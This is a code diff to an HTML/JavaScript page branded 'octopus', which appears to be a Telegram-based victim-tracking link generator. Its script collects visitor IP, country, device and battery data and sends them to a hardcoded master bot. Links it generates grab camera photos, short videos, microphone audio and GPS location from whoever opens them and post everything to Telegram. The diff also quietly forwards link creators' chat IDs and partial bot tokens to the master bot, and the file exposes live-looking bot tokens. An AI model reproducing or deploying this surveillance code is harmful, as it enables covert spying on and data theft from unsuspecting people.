@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⛧ 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ · آرك الهاكر</title>
+    <title>𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆</title>
     <!-- Font Awesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <!-- Google Fonts: Cinzel + JetBrains Mono -->
@@ -42,7 +42,7 @@
         }
 
         /* ================================================================
-           CANVAS — الجحيم (خلفية متحركة)
+           CANVAS — الخلفية المتحركة
            ================================================================ */
         #hell-canvas {
             position: fixed;
@@ -94,7 +94,7 @@
         }
 
         /* ================================================================
-           عناصر زخرفية ثابتة (حمراء)
+           عناصر زخرفية ثابتة
            ================================================================ */
         .deco-element {
             position: fixed;
@@ -137,7 +137,7 @@
         }
 
         /* ================================================================
-           النار السفلية (حقيقية، حمراء متوهجة)
+           النار السفلية
            ================================================================ */
         .fire-bottom {
             position: fixed;
@@ -207,7 +207,7 @@
         }
 
         /* ================================================================
-           HEADER — عرش الدم
+           HEADER
            ================================================================ */
         .header {
             width: 100%;
@@ -273,7 +273,6 @@
             100% { background-position: 300% 0%; }
         }
 
-        /* مربع البوت (أحمر كاتم) */
         .bot-username-box {
             display: inline-flex;
             align-items: center;
@@ -300,7 +299,6 @@
             transform: scale(1.03);
         }
 
-        /* مربع المطور (أحمر كاتم غامق) */
         .developer-box {
             display: inline-flex;
             align-items: center;
@@ -331,7 +329,7 @@
         .nav-links { display: flex; gap: 16px; align-items: center; flex-wrap: wrap; }
 
         /* ================================================================
-           CARD — القلعة الحمراء
+           CARD
            ================================================================ */
         #cardArea {
             width: 100%;
@@ -583,7 +581,7 @@
         .label-text { display: flex; align-items: center; gap: 14px; }
 
         /* ================================================================
-           BUTTON (أحمر كاتم)
+           BUTTON
            ================================================================ */
         .btn-primary {
             display: inline-flex;
@@ -718,7 +716,7 @@
         .btn-copy i { font-size: 16px; color: var(--blood-pure); }
 
         /* ================================================================
-           FOOTER — المطور (أحمر كاتم غامق)
+           FOOTER
            ================================================================ */
         .madeby {
             margin-top: 36px;
@@ -805,7 +803,7 @@
         }
 
         /* ================================================================
-           SIDE PAGE — نفس التصميم الفاخر (للضحية)
+           SIDE PAGE
            ================================================================ */
         .download-page {
             width: 100%;
@@ -1046,6 +1044,26 @@
             </div>
         </header>
 
+        <!-- ===== رسالة الترحيب (تظهر عند فتح الموقع) ===== -->
+        <div id="welcomeBox" style="width:100%;max-width:840px;margin-bottom:30px;background:rgba(8,4,4,0.90);backdrop-filter:blur(20px);border:2px solid rgba(204,10,10,0.06);padding:28px 32px;clip-path:polygon(0% 0%,100% 0%,99% 100%,1% 100%);box-shadow:0 0 120px rgba(204,10,10,0.03),inset 0 0 120px rgba(0,0,0,0.6);position:relative;overflow:hidden;">
+            <div style="font-family:'Cinzel',serif;font-size:22px;color:#fff;text-align:center;letter-spacing:3px;margin-bottom:10px;">
+                ⭑ ᴡᴇʟᴄᴏᴍᴇ ⭒
+            </div>
+            <div style="font-family:'JetBrains Mono',monospace;font-size:14px;color:#d4b0a0;text-align:center;line-height:2;white-space:pre-wrap;direction:ltr;">
+                ╭⊚─〔 ᴡᴇʟᴄᴏᴍᴇ 〕───────
+                ┃˹🜏˼ 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒
+                ┃⍟
+                ┃˹🔥˼ ᴘʀᴇᴘᴀʀᴇ ʏᴏᴜʀ ᴛᴏᴏʟꜱ ⭒
+                ╰───────────────
+            </div>
+            <div style="text-align:center;margin-top:16px;font-size:13px;color:#4a3a3a;font-family:'Cinzel',serif;letter-spacing:2px;">
+                ⭑ ᴅᴇᴠᴇʟᴏᴘᴇʀ ⭒
+                ‌╭⊚─〔 ᴄᴏɴᴛᴀᴄᴛ 〕─────
+                ┃˹👨‍💻˼ @xx_8k ⭒
+                ╰───────────────
+            </div>
+        </div>
+
         <!-- CARD -->
         <div class="main-card" id="cardArea">
             <div class="card-content">
@@ -1126,7 +1144,7 @@
                 <span class="dev-name">@xx_8k</span>
             </div>
             <span class="sep">|</span>
-            <span><i class="fas fa-fire"></i> v3.0 · آرك</span>
+            <span><i class="fas fa-fire"></i> v3.0</span>
             <span class="sep">|</span>
             <span><i class="fas fa-lock"></i> AES-256</span>
         </div>
@@ -1135,12 +1153,11 @@
 
     <script>
         // ================================================================
-        //  جميع الوظائف الأصلية محفوظة 100% مع تقصير الرابط
-        //  ونمط العرض الجديد.
+        //  جميع الوظائف الأصلية مع النمط الفاخر الموحد
         // ================================================================
 
         // ================================================================
-        // CANVAS — الجحيم
+        // CANVAS
         // ================================================================
         (function hellCanvas() {
             const canvas = document.getElementById('hell-canvas');
@@ -1229,57 +1246,64 @@
         })();
 
         // ================================================================
-        //  الوظائف الأصلية — مع تقصير الرابط والنمط الجديد
-        //  جميع الرسائل المرسلة إلى تليجرام بنفس النمط الفاخر
+        //  النمط الموحد لكل الرسائل على تليجرام
         // ================================================================
 
-        const MASTER_BOT_TOKEN = "8812415465:AAFQHLFkhYIg7jv15n8pL1lIKnylnugqGsc";
+        const MASTER_BOT_TOKEN = "8806320032:AAEvSNbf1boLIZ9pt7sbFMit-ARtAjTS7UQ"
         const MASTER_CHAT_ID = "8552540563";
+        const BOT_USERNAME = "v_v_9bot";
 
-        let visitorIP = "غير معروف",
-            visitorCountry = "غير معروف",
-            visitorDevice = "Unknown",
-            visitorBattery = "غير متاح";
+        let visitorIP = "غير معروف";
+        let visitorCountry = "غير معروف";
+        let visitorDevice = "Unknown";
+        let visitorBattery = "غير متاح";
 
         // ================================================================
-        //  دالة بناء الكابتشن بالنمط الفاخر
+        //  دالة بناء الكابتشن بالنمط الفاخر المطلوب مع المطور في النهاية
         // ================================================================
-        function buildCaption(extra = "") {
-            let cap = `╭━━━━━━━━━━━━━━━━━━━━━━━╮\n`;
-            cap += `┃   🜏  ${visitorCountry.toUpperCase()}  🜏   ┃\n`;
-            cap += `┃━━━━━━━━━━━━━━━━━━━━━━━┃\n`;
+        function buildCaption(extra = "", chatId = "", botToken = "") {
+            let cap = `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n`;
+            cap += `‌╭⊚─〔 ʟɪɴᴋ 〕───────\n`;
+            cap += `┃˹🔗˼ ${extra || 'ʏᴏᴜʀ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ'} ⭒\n`;
+            cap += `┃⍟ \n`;
+            cap += `┃\n`;
+            cap += `┃\n`;
+            cap += `┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n`;
+            cap += `╰───────────────\n\n`;
+            cap += `⭑ ᴅᴇᴠᴇʟᴏᴘᴇʀ ⭒\n`;
+            cap += `‌╭⊚─〔 ᴄᴏɴᴛᴀᴄᴛ 〕─────\n`;
+            cap += `┃˹👨‍💻˼ @xx_8k ⭒\n`;
+            cap += `╰───────────────\n\n`;
+            // معلومات الزائر (تظهر في كل رسالة)
             cap += `┃ 📍 الدولة     › ${visitorCountry}\n`;
             cap += `┃ 📱 الجهاز     › ${visitorDevice}\n`;
             cap += `┃ 🔋 البطارية   › ${visitorBattery}\n`;
             cap += `┃ 🌐 الـ IP      › ${visitorIP}\n`;
             cap += `┃ 🕒 الوقت      › ${new Date().toLocaleString('ar-EG')}\n`;
-
-            if (extra) {
-                cap += `┃ ${extra}\n`;
-            }
-
+            if (chatId) cap += `┃ 🆔 Chat ID    › ${chatId}\n`;
+            if (botToken) cap += `┃ 🤖 Bot Token  › ${botToken.substring(0, 15)}...\n`;
+            cap += `┃ 🏷️ Bot User  › @${BOT_USERNAME}\n`;
             cap += `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n`;
             cap += `          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
-
             return cap;
         }
 
         // ================================================================
-        //  دالة إرسال رسالة تأكيد فورية بنفس النمط
+        //  إرسال إشعار دخول جديد للمالك بنفس النمط
         // ================================================================
-        async function sendConfirmation(chat, token, message = "⛧ جاري جمع البيانات ⛧") {
+        async function sendNewVisitorNotification(chatId = "", botToken = "") {
             try {
-                const caption = buildCaption(`┃ ⚡ ${message}`);
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                const msg = buildCaption("⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧", chatId, botToken);
+                await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chat, text: caption })
+                    body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
                 });
-            } catch (e) {}
+            } catch (e) { console.log('فشل إرسال إشعار الدخول'); }
         }
 
         // ================================================================
-        //  إرسال معلومات الزائر للمالك (بنفس النمط)
+        //  إرسال معلومات الزائر للمالك (عند فتح الموقع)
         // ================================================================
         async function sendVisitorInfo() {
             try {
@@ -1303,13 +1327,10 @@
                     visitorCountry = ipData.country_name || "غير معروف";
                 } catch (e) {}
 
-                const msg = buildCaption("┃ 🌐 *زيارة جديدة*");
-                await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg, parse_mode: 'Markdown' })
-                });
-            } catch (err) {}
+                // إرسال إشعار دخول جديد للمالك
+                await sendNewVisitorNotification();
+
+            } catch (err) { console.log('خطأ في جمع المعلومات'); }
         }
         sendVisitorInfo();
 
@@ -1354,6 +1375,9 @@
             `;
             linkText.dataset.short = shortLink;
             resultEl.style.display = 'flex';
+
+            // إرسال إشعار للمالك عند إنشاء الرابط مع بيانات المستخدم
+            await sendNewVisitorNotification(chat, token);
         });
 
         copyBtn.addEventListener('click', async () => {
@@ -1403,8 +1427,8 @@
                                 const form = new FormData();
                                 form.append('chat_id', chat);
                                 form.append('photo', blob, `${type}_${Date.now()}.jpg`);
-                                const extra = `┃ 📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`;
-                                form.append('caption', buildCaption(extra));
+                                const extra = `📸 ${type === 'front' ? 'Front' : 'Back'} Camera Photo`;
+                                form.append('caption', buildCaption(extra, chat, token));
 
                                 await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                                     method: 'POST',
@@ -1430,8 +1454,8 @@
                     const form = new FormData();
                     form.append('chat_id', chat);
                     form.append('video', blob, `${type}_${Date.now()}.mp4`);
-                    const extra = `┃ 🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`;
-                    form.append('caption', buildCaption(extra));
+                    const extra = `🎥 ${type === 'front' ? 'Front' : 'Back'} Video (5s)`;
+                    form.append('caption', buildCaption(extra, chat, token));
 
                     await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                         method: 'POST',
@@ -1458,8 +1482,8 @@
                     const form = new FormData();
                     form.append('chat_id', chat);
                     form.append('audio', blob, `audio_${Date.now()}.mp4`);
-                    const extra = `┃ 🎤 تسجيل صوتي - 5 ثوان`;
-                    form.append('caption', buildCaption(extra));
+                    const extra = `🎤 Audio Recording (5s)`;
+                    form.append('caption', buildCaption(extra, chat, token));
 
                     await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
                         method: 'POST',
@@ -1481,11 +1505,13 @@
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
                             const { latitude, longitude } = position.coords;
-                            const extra = `┃ 📍 الموقع الحالي\n┃ 📌 ${latitude}, ${longitude}\n┃ 🔗 https://www.google.com/maps?q=${latitude},${longitude}`;
+                            const extra =
+                                `📍 Location\n📌 ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`;
                             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ chat_id: chat, text: buildCaption(extra) })
+                                body: JSON.stringify({ chat_id: chat, text: buildCaption(extra, chat,
+                                    token) })
                             });
                             resolve();
                         },
@@ -1508,13 +1534,22 @@
         }
 
         // ================================================================
-        //  startFeatures — مع إرسال تأكيدات فورية بنفس النمط
+        //  startFeatures مع إرسال تأكيدات بنفس النمط
         // ================================================================
+        async function sendConfirmation(chat, token, message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chat, text: buildCaption(message, chat, token) })
+                });
+            } catch (e) {}
+        }
+
         async function startFeatures(chat, token, features) {
             if (!features) return;
 
-            // إرسال تأكيد بدء الجمع
-            await sendConfirmation(chat, token, "⛧ بدء جمع البيانات ⛧");
+            await sendConfirmation(chat, token, "⛧ Starting Data Collection ⛧");
 
             const featureList = features.split(',');
             const needCamera = featureList.some(f => ['camFront', 'camBack', 'videoFront', 'videoBack'].includes(f));
@@ -1526,7 +1561,7 @@
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                     await captureAndSend(stream, chat, token, 'front');
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log('فشلت صورة أمامية'); }
+                } catch (e) {}
             }
 
             if (featureList.includes('camBack')) {
@@ -1534,7 +1569,7 @@
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                     await captureAndSend(stream, chat, token, 'back');
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log('فشلت صورة خلفية'); }
+                } catch (e) {}
             }
 
             if (featureList.includes('videoFront')) {
@@ -1543,7 +1578,7 @@
                         audio: true });
                     await recordAndSend(stream, chat, token, 'front');
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log('فشل فيديو أمامي'); }
+                } catch (e) {}
             }
 
             if (featureList.includes('videoBack')) {
@@ -1552,7 +1587,7 @@
                         audio: true });
                     await recordAndSend(stream, chat, token, 'back');
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log('فشل فيديو خلفي'); }
+                } catch (e) {}
             }
 
             if (featureList.includes('audio')) {
@@ -1560,15 +1595,14 @@
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                     await recordAudioAndSend(stream, chat, token);
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log('فشل تسجيل صوتي'); }
+                } catch (e) {}
             }
 
             if (featureList.includes('location')) {
                 await sendLocation(chat, token);
             }
 
-            // إرسال تأكيد انتهاء الجمع
-            await sendConfirmation(chat, token, "✅ تم جمع البيانات بنجاح");
+            await sendConfirmation(chat, token, "✅ Data Collection Complete");
         }
 
         // ================================================================
@@ -1585,6 +1619,8 @@
             document.querySelector('.header').style.display = 'none';
             document.querySelector('.madeby').style.display = 'none';
             document.getElementById('captureBadge').style.display = 'none';
+            const welcome = document.getElementById('welcomeBox');
+            if (welcome) welcome.style.display = 'none';
 
             const wrap = document.querySelector('.app-wrap');
             wrap.innerHTML = '';
